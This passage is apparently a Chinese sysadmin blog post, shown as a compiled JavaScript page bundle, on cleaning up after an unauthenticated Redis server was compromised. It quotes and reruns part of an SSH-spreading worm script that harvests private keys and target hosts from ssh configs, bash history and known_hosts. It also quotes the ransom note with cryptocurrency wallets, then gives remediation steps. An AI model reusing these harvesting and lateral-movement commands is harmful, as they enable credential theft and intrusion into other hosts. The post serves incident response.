ldfx58.XXXX.io\nhistory -c\n\n这段代码的目的是在远程主机上执行一段命令，通过 SSH 连接进行操作。在第一次执行时，它会执行 localgo 函数以搜索和连接主机，并在这些主机上执行一段远程命令。在执行完毕后，会创建一个锁文件 /var/tmp/.alsp 来防止再次执行。最后，输出一些信息并清除命令历史。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br")])]),a("h3",{attrs:{id:"解决方法-5"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决方法-5"}},[s._v("#")]),s._v(" 解决方法")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("获取变量\nKEYS=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)\nKEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F \"IdentityFile\" '{print $2 }')\nKEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)\nHOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F \"HostName\" '{print $2}')\nHOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E \"(ssh|scp)\" | grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\")\nHOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | uniq)\nUSERZ=$(\n        echo \"root\"\n        find ~/ /root /home -maxdepth 2 -name '\\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -v \"\\.ssh\"\n    )\nuserlist=$(echo $USERZ | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\nhostlist=$(echo \"$HOSTS $HOSTS2 $HOSTS3\" | grep -vw 127.0.0.1 | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\nkeylist=$(echo \"$KEYS $KEYS2 $KEYS3\" | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)    \n\necho $KEYS\n/root/.ssh/id_rsa /root/.ssh/id_rsa\necho $KEYS2\n\necho $KEYS3\n\necho $HOSTS\n\necho $HOSTS2\n\necho $HOSTS3\n10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190\n\necho $USERZ\nroot www\n\necho $userlist\nroot www\n\necho $hostlist\n10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190\n\necho $keylist\n/root/.ssh/id_rsa\n\nssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i /root/.ssh/id_rsa root@172.30.149.186\n报错：\nssh: connect to host 172.30.149.186 port 22: Connection refused\n修改登录ssh端口，保护了局域网的其他主机\n\nchattr -i /var/tmp/.alsp\nrm -rf /var/tmp/.alsp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br")])]),a("h1",{attrs:{id:"安全防护"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安全防护"}},[s._v("#")]),s._v(" 安全防护")]),s._v(" "),a("p",[s._v("查找原因，初步原因可能是redis，但是redis并没有暴露到公网。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("\n# netstat -tunpl|grep redis\ntcp        0      0 172.30.149.182:63920    0.0.0.0:*               LISTEN      1054/redis-server 1 \ntcp        0      0 127.0.0.1:63920         0.0.0.0:*               LISTEN      1054/redis-server 1 \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('127.0.0.1:63920> KEYS *\n1) "READ_ME_TO_RECOVER_DATA"\n\n127.0.0.1:63920> get READ_ME_TO_RECOVER_DATA\n"We delete all databases, but download a copy to our server. The only way of recovery is you must send 0.01 BTC to XXXXXXXXXXXXXXXXX. You have until 48 hours to pay or data will be inaccessible. Once paid please email XXX@onionmail.com with code: `XXX` and we will recover your database. please read https://XXXXX.sh/XXXXXXXXXXXX for more information"\n\n妥妥的威胁！\n127.0.0.1:63920> del READ_ME_TO_RECOVER_DATA #删除 READ_ME_TO_RECOVER_DATA\n\n\n# 关闭 redis\nredis-cli -h 127.0.0.1 -p 63920 shutdown\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("p",[s._v("访问留下来的链接")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://imgoss.xgss.net/picgo/image-20230817162847974.png?aliyun",alt:"image-20230817162847974"}})]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("There are different ways you can buy Bitcoin. You can pay with credit or debit card at these websites\n\nMoonpay - https://www.moonpay.com/buy/btc\nCoinbase - https://www.coinbase.com/\n\nOn this site you can use various methods such as apple Pay, gift card to buy Bitcoin\nPaxful - https://paxful.com/buy-bitcoin\nAgoradesk - https://agoradesk.com/\n\nIf Bitcoin does not suit your needs, we can accept other cryptocurrencies. We cannot accept fiat, CRYPTO IS ONLY PAYMENT\nSend the amount provided to the right address\n3.36 LITECOIN (LTC) - LecBz5uWLaQhoqu1vcDjSxm8yc6fMuaaKc\n1.81 MONERO (XMR) - 43pt1h8xCymBbN1t8nU7fjdUWHKTVx3ppCVbmc75C6btSuPxm5MspNrFZFtD6bhevH2JdPQJP2vGCLRdbr616Kgs1snvuZF\n0.16 ETHEREUM (ETH) - 0xA942bB96B758E1271Be56744c29d8dCF14A56E3a\n9.13 DASH - XihfDnbrDAHT7a9Yc3y8fjvMcDQfWVPSmk\n3898 DOGECOIN (DOGE) - D5agMNse94NhZtCjSSQtiw2sjh6N7fJCqF\n\nWhen using other coins please mention that in email.\n\nThere is no other method of recovery from us other than payment. After 48 hours you will forever lose access to data \nand we may do our own things with it. We will either sell your database on dark net markets, disclose data to your\nusers and ask payment there or simply delete it. \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])]),a("p",[s._v("因为redis端口是对内网，所以配置redis是无密码，没想到还是中招了。")]),s._v(" "),a("h2",{attrs:{id:"解决方法-6"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决方法-6"}},[s._v("#")]),s._v(" 解决方法")]),s._v(" "),a("p",[s._v("给redis添加复杂密码，或者关闭reidis。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("修改配置文件中的密码\nrequirepass XXXXXXX\n\n# redis-cli -h 127.0.0.1 -p 63920 -a XXXXXXX\n127.0.0.1:63920> info\n\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("排查其他服务器，是否还有没有密码的redis，没有密码的redis服务器一定要添加复杂的密码，即使没有端口没有暴漏公网。")]),s._v(" "),a("h2",{attrs:{id:"安全等级增加"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安全等级增加"}},[s._v("#")]),s._v(" 安全等级增加")]),s._v(" "),a("p",[s._v("后期为了安全需要做个堡垒机了，这个就以后专门写一篇相关的文章。")])])}),[],!1,null,null,null);n.default=t.exports}}]);